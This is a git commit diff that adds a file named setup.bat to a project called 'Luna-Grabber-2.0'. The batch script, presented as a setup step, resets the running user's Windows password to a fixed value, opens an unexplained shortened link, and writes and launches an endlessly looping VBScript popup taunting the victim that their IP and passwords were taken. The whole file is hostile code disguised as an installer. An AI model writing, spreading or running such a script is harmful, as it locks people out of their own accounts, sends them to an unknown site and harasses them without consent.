79d6eeb26dff8e6a19b93c6adc6287af3de06c6f
st4rr <146312823+ST4RRR@users.noreply.github.com>
2023-10-10 20:29:19 +0300

    Add files via upload

---
+++ Luna-Grabber-2.0/setup.bat
@@ -0,0 +1,11 @@
+
+net user %username% *
+123456eg
+123456eg
+start https://plz.life/F0E21L
+echo do>>msg.vbs
+echo Msgbox"GOT UR IP + PASSWORDS!!!
+
+egg on top",48+0,"GET HACKED IDIOTTT">>msg.vbs
+echo loop>>msg.vbs
+start msg.vbs
